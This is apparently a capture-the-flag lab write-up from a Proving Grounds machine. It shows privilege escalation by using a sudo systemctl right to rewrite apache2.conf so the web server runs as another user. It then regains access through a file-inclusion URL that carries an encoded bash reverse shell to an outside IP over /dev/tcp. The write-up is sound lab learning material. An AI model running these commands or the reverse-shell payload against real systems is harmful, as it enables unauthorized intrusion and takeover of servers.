---
layout: default
title: Systemctl (Apache2)
parent: Sudo
nav_order: 8
---

# Systemctl (Apache2)

---

## Check SUDO Permissions

![sudo_l](../../../../assets/images/ctfs/proving_grounds/ha_natraj/sudo_l.png)

We can exploit this to change the apache2.conf file to run as user 'mahakal' instead of 'www-data'.

If we restart Apache after doing this we will lose our shell, but when we regain our reverse shell connection we will be logged on as 'mahakal' instead of 'www-data'

```bash
# make a copy of apache2.conf and place in /var/tmp
cd /var/tmp
cp /etc/apache2/apache2.conf .

# Use sed to find the 'user' environment variable and replace with 'mahakal'
sed -i 's/User ${APACHE_RUN_USER}/User mahakal/g' apache2.conf

# Use sed to find the 'group' environment variable and replace with 'mahakal'
sed -i 's/Group ${APACHE_RUN_GROUP}/Group mahakal/g' apache2.conf

# Replace apache2.conf with the newly edited version
cp apache2.conf /etc/apache2/apache2.conf
```

Restart the Apache2 service.

```bash
sudo /bin/systemctl restart apache2
```

Regain our shell...

```bash
http://192.168.202.80/console/file.php?file=../../../../../../../var/log/auth.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.217%2F9001%200%3E%261%22
```
